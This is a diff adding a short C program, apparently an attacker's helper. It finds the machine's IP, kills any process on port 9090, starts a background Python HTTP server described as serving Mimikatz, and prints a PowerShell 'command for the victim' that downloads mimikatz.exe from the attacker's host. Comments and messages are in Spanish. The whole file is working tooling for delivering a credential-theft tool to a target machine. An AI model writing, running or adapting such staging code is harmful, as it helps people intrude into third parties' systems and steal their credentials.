@@ -1,0 +1,60 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <netinet/in.h>
+#include <net/if.h>
+#include <arpa/inet.h>
+
+const char* priority_ifaces[] = {"tun0", "wlan0", "eth0", "rmnet_data0"};
+#define IFACE_COUNT 4
+#define PORT 9090
+
+char* get_best_ip() {
+    int fd;
+    struct ifreq ifr;
+    static char ip[16];
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
+    for (int i = 0; i < IFACE_COUNT; i++) {
+        ifr.ifr_addr.sa_family = AF_INET;
+        strncpy(ifr.ifr_name, priority_ifaces[i], IFNAMSIZ-1);
+        if (ioctl(fd, SIOCGIFADDR, &ifr) == 0) {
+            strcpy(ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
+            close(fd);
+            return ip;
+        }
+    }
+    close(fd);
+    return NULL;
+}
+
+int main() {
+    char* my_ip = get_best_ip();
+    if (!my_ip) {
+        printf("[!] Error: No hay red activa en Naucalpan.\n");
+        return 1;
+    }
+
+    printf("[+] IP Detectada: %s\n", my_ip);
+
+    // Paso 2: Limpiar el puerto antes de lanzar
+    printf("[*] Limpiando puerto %d...\n", PORT);
+    char kill_cmd[64];
+    sprintf(kill_cmd, "fuser -k %d/tcp > /dev/null 2>&1", PORT);
+    system(kill_cmd);
+
+    // Paso 3: Lanzar el servidor en segundo plano (&)
+    printf("[+] Lanzando servidor de Mimikatz en puerto %d...\n", PORT);
+    char srv_cmd[128];
+    sprintf(srv_cmd, "python3 -m http.server %d > /dev/null 2>&1 &", PORT);
+    system(srv_cmd);
+
+    printf("\n--- COMANDO PARA LA VÍCTIMA ---\n");
+    printf("powershell -c \"iwr -uri http://%s:%d/mimikatz.exe -outfile m.exe\"\n", my_ip, PORT);
+    printf("-------------------------------\n");
+    printf("[i] El servidor sigue corriendo. Usa 'pkill python3' para detenerlo.\n");
+
+    return 0;
+}
